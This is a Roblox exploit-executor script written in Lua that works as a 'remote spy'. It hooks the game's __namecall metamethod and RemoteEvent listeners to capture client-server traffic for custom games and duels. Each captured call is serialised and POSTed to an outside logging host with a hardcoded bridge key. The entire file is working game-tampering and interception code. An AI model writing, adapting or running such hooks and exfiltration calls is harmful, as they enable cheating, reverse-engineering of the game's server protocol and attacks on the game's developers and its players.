local Http = game:GetService("HttpService")
local RS = game:GetService("ReplicatedStorage")
local req = (syn and syn.request) or (http and http.request) or http_request or request
local URL = "https://roblox-gdke.onrender.com/log"
local KEY = "123579090Ecrinardanew"

local function dump(v, d)
    d = d or 0
    local t = typeof(v)
    if t == "Instance" then return ("<%s:%s>"):format(v.ClassName, v.Name) end
    if t == "string" then return ("%q"):format(v) end
    if t == "number" or t == "boolean" or t == "nil" then return tostring(v) end
    if t == "table" then
        if d > 4 then return "{...}" end
        local p = {}
        for k, val in pairs(v) do p[#p+1] = "["..dump(k,d+1).."]="..dump(val,d+1) end
        return "{"..table.concat(p, ", ").."}"
    end
    return ("<%s:%s>"):format(t, tostring(v))
end

local function send(msg)
    task.spawn(function()
        pcall(req, {
            Url = URL, Method = "POST",
            Headers = { ["Content-Type"] = "application/json", ["X-Bridge-Key"] = KEY },
            Body = Http:JSONEncode({ name = "SPY", channel = "vs", msg = msg }),
        })
    end)
end

local cg = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("CustomGames")
if cg then
    local names = {}
    for _, c in ipairs(cg:GetDescendants()) do
        names[#names+1] = c.ClassName .. ":" .. c.Name
        if c:IsA("RemoteEvent") then
            c.OnClientEvent:Connect(function(...)
                local a = {...}
                local s = {}
                for i = 1, #a do s[i] = dump(a[i]) end
                send("RECV " .. c.Name .. "(" .. table.concat(s, ", ") .. ")")
            end)
        end
    end
    send("CUSTOMGAMES: " .. table.concat(names, ", "))
end

if hookmetamethod and getnamecallmethod then
    local old
    old = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
        local m = getnamecallmethod()
        if (m == "FireServer" or m == "InvokeServer") and typeof(self) == "Instance" then
            local fn = self:GetFullName():lower()
            if fn:find("custom") or fn:find("duel") or fn:find("server") or fn:find("mode") or fn:find("setting") or fn:find("spec") then
                local a = {...}
                local s = {}
                for i = 1, #a do s[i] = dump(a[i]) end
                send("SEND " .. m .. " " .. self:GetFullName() .. "(" .. table.concat(s, ", ") .. ")")
            end
        end
        return old(self, ...)
    end))
    send("SPY_READY")
else
    send("SPY_NO_HOOK")
end
